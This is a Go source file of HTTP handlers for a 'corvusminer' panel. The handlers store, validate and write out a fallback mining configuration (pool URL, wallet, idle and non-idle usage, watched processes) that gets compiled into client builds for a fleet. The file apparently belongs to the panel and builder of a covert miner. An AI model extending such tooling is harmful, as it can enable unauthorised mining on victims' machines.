package handlers

import (
	"bytes"
	"corvusminer/panel/models"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

// The embedded fallback config is the JSON a client uses when it cannot reach
// the panel. It is stored here (not on the build host) so an operator can edit
// it from the UI and every build picks it up.
const (
	settingEmbeddedMode = "build.embedded_config_mode"
	settingEmbeddedJSON = "build.embedded_config_json"

	embeddedModeNone   = "none"
	embeddedModePanel  = "panel"
	embeddedModeCustom = "custom"
)

// embeddedMiner mirrors the per-miner object inside the fallback config.
type embeddedMiner struct {
	MiningURL    string  `json:"mining_url"`
	Wallet       string  `json:"wallet"`
	Password     string  `json:"password"`
	Algo         string  `json:"algo"`
	NonIdleUsage float64 `json:"non_idle_usage"`
	IdleUsage    float64 `json:"idle_usage"`
	FanSpeed     int     `json:"fan_speed"`
	WaitTimeIdle int     `json:"wait_time_idle"`
	UseSSL       int     `json:"use_ssl"`
	Worker       string  `json:"worker"`
}

// embeddedConfigDoc is the document the client parses in
// ConfigManager::ParseConfigFromJson.
type embeddedConfigDoc struct {
	CPUConfig        *embeddedMiner `json:"cpu_config"`
	GPUConfig        *embeddedMiner `json:"gpu_config"`
	EnableCPU        *int           `json:"enable_cpu"`
	EnableGPU        *int           `json:"enable_gpu"`
	WatchedProcesses []string       `json:"watched_processes"`
}

type embeddedConfigPayload struct {
	Mode        string `json:"mode"`
	CustomJSON  string `json:"custom_json"`
	DerivedJSON string `json:"derived_json"`
	UpdatedAt   string `json:"updated_at,omitempty"`
}

// loadEmbeddedSetting reads the stored fallback config. A missing DB (tests) or
// missing rows fall back to the panel-derived config, which is the sane default.
func (h *Handler) loadEmbeddedSetting() (mode, custom, updatedAt string) {
	mode = embeddedModePanel
	if h.db == nil {
		return mode, "", ""
	}
	if stored, err := h.db.GetSetting(settingEmbeddedMode); err == nil && stored != "" {
		switch stored {
		case embeddedModeNone, embeddedModePanel, embeddedModeCustom:
			mode = stored
		}
	} else if err != nil {
		log.Printf("Could not load embedded config mode: %v", err)
	}
	custom, _ = h.db.GetSetting(settingEmbeddedJSON)
	return mode, custom, ""
}

// derivedEmbeddedConfig renders the current panel configuration as the JSON a
// client embeds, so the fallback always matches what the panel serves.
func (h *Handler) derivedEmbeddedConfig() (string, error) {
	if h.db == nil {
		return "", errors.New("no database available")
	}
	cfg, err := h.db.GetConfig()
	if err != nil {
		return "", err
	}
	if cfg == nil {
		return "", errors.New("panel config is empty")
	}
	return buildEmbeddedDoc(cfg)
}

// buildEmbeddedDoc renders a stored panel config as the fallback document.
func buildEmbeddedDoc(cfg *models.Config) (string, error) {
	var watched []string
	for _, p := range strings.Split(cfg.WatchedProcesses, ",") {
		if p = strings.TrimSpace(p); p != "" {
			watched = append(watched, p)
		}
	}
	if watched == nil {
		watched = []string{}
	}

	doc := map[string]interface{}{
		"cpu_config":        json.RawMessage(cfg.CPUConfig),
		"gpu_config":        json.RawMessage(cfg.GPUConfig),
		"enable_cpu":        cfg.EnableCPU,
		"enable_gpu":        cfg.EnableGPU,
		"watched_processes": watched,
		"timestamp":         time.Now().Unix(),
	}
	if !json.Valid([]byte(cfg.CPUConfig)) {
		doc["cpu_config"] = map[string]interface{}{}
	}
	if !json.Valid([]byte(cfg.GPUConfig)) {
		doc["gpu_config"] = map[string]interface{}{}
	}

	data, err := json.MarshalIndent(doc, "", "  ")
	if err != nil {
		return "", err
	}
	return string(data), nil
}

// validateEmbeddedConfigJSON ensures a stored fallback cannot ship a broken
// endpoint to the whole fleet when the panel is offline.
func validateEmbeddedConfigJSON(data []byte) error {
	trimmed := bytes.TrimSpace(data)
	if len(trimmed) == 0 {
		return errors.New("fallback config is empty")
	}
	if !json.Valid(trimmed) {
		return errors.New("fallback config is not valid JSON")
	}

	var doc embeddedConfigDoc
	if err := json.Unmarshal(trimmed, &doc); err != nil {
		return fmt.Errorf("fallback config has the wrong shape: %w", err)
	}
	if doc.CPUConfig == nil && doc.GPUConfig == nil {
		return errors.New("fallback config must contain cpu_config and/or gpu_config")
	}

	cpuEnabled := doc.EnableCPU == nil || *doc.EnableCPU != 0
	gpuEnabled := doc.EnableGPU == nil || *doc.EnableGPU != 0

	if cpuEnabled && doc.CPUConfig != nil {
		if err := validatePoolEndpoint("", doc.CPUConfig.MiningURL); err != nil {
			return fmt.Errorf("cpu_config: %w", err)
		}
		if strings.TrimSpace(doc.CPUConfig.Wallet) == "" {
			return errors.New("cpu_config: wallet is required")
		}
	}
	if gpuEnabled && doc.GPUConfig != nil {
		if err := validatePoolEndpoint(doc.GPUConfig.Algo, doc.GPUConfig.MiningURL); err != nil {
			return fmt.Errorf("gpu_config: %w", err)
		}
		if strings.TrimSpace(doc.GPUConfig.Wallet) == "" {
			return errors.New("gpu_config: wallet is required")
		}
	}
	for _, proc := range doc.WatchedProcesses {
		if strings.TrimSpace(proc) == "" || hasControlChars(proc) {
			return errors.New("watched_processes contains an invalid entry")
		}
	}
	return nil
}

// EmbeddedConfigGetOrSave dispatches the single embedded-config endpoint: GET
// reads the stored settings, POST saves them.
func (h *Handler) EmbeddedConfigGetOrSave(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		h.EmbeddedConfigSave(w, r)
		return
	}
	h.EmbeddedConfigGet(w, r)
}

// EmbeddedConfigGet returns the stored fallback settings plus a preview of the
// config derived from the current panel configuration.
func (h *Handler) EmbeddedConfigGet(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	mode, custom, updated := h.loadEmbeddedSetting()
	derived, err := h.derivedEmbeddedConfig()
	if err != nil {
		derived = ""
	}

	payload := embeddedConfigPayload{
		Mode:        mode,
		CustomJSON:  custom,
		DerivedJSON: derived,
		UpdatedAt:   updated,
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(payload)
}

// EmbeddedConfigSave stores the fallback mode and, for custom mode, the JSON.
func (h *Handler) EmbeddedConfigSave(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		Mode string `json:"mode"`
		JSON string `json:"json"`
	}
	if err := json.NewDecoder(io.LimitReader(r.Body, 256<<10)).Decode(&req); err != nil {
		writeJSONError(w, http.StatusBadRequest, "Invalid request body: "+err.Error())
		return
	}

	switch req.Mode {
	case embeddedModeNone, embeddedModePanel, embeddedModeCustom:
	default:
		writeJSONError(w, http.StatusBadRequest, "mode must be one of: none, panel, custom")
		return
	}

	// Saving in custom mode means this exact JSON will be compiled into the
	// client, so it has to be valid before it is stored.
	normalized := strings.TrimSpace(req.JSON)
	if req.Mode == embeddedModeCustom {
		if err := validateEmbeddedConfigJSON([]byte(normalized)); err != nil {
			writeJSONError(w, http.StatusBadRequest, err.Error())
			return
		}
	}
	if req.Mode == embeddedModePanel {
		if _, err := h.derivedEmbeddedConfig(); err != nil {
			writeJSONError(w, http.StatusBadRequest,
				"cannot derive the fallback config from the panel configuration: "+err.Error())
			return
		}
		normalized = ""
	}

	if h.db == nil {
		writeJSONError(w, http.StatusInternalServerError, "no database available")
		return
	}
	if err := h.db.SetSetting(settingEmbeddedMode, req.Mode); err != nil {
		writeJSONError(w, http.StatusInternalServerError, "Could not save setting: "+err.Error())
		return
	}
	if err := h.db.SetSetting(settingEmbeddedJSON, normalized); err != nil {
		writeJSONError(w, http.StatusInternalServerError, "Could not save setting: "+err.Error())
		return
	}

	log.Printf("Embedded fallback config saved (mode=%s)", req.Mode)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"success": true,
		"mode":    req.Mode,
		"message": "Fallback configuration saved",
	})
}

// materializeEmbeddedConfig writes the fallback JSON to a temp file for the
// builder. It returns ("", nil) when no fallback should be embedded.
func (h *Handler) materializeEmbeddedConfig(mode, customJSON, legacy string) (path string, cleanup func(), err error) {
	noop := func() {}

	// A request without a mode keeps the pre-setting behaviour: older pages sent
	// "auto"/"none" in embedded_config.
	if mode == "" {
		switch strings.ToLower(strings.TrimSpace(legacy)) {
		case embeddedModeNone, "off", "false":
			mode = embeddedModeNone
		default:
			mode = embeddedModePanel
		}
	}

	switch mode {
	case embeddedModeNone:
		return "", noop, nil

	case embeddedModePanel:
		derived, derr := h.derivedEmbeddedConfig()
		if derr != nil {
			return "", noop, fmt.Errorf("derive fallback config: %w", derr)
		}
		return writeTempJSON(derived)

	case embeddedModeCustom:
		if err := validateEmbeddedConfigJSON([]byte(customJSON)); err != nil {
			return "", noop, err
		}
		return writeTempJSON(customJSON)

	default:
		return "", noop, fmt.Errorf("unknown embedded config mode %q", mode)
	}
}

func writeTempJSON(content string) (string, func(), error) {
	f, err := os.CreateTemp("", "corvus-embedded-config-*.json")
	if err != nil {
		return "", func() {}, err
	}
	path := f.Name()
	if _, err := f.WriteString(content); err != nil {
		f.Close()
		os.Remove(path)
		return "", func() {}, err
	}
	if err := f.Close(); err != nil {
		os.Remove(path)
		return "", func() {}, err
	}
	return path, func() { os.Remove(path) }, nil
}

func writeJSONError(w http.ResponseWriter, status int, message string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(map[string]any{"success": false, "error": message})
}
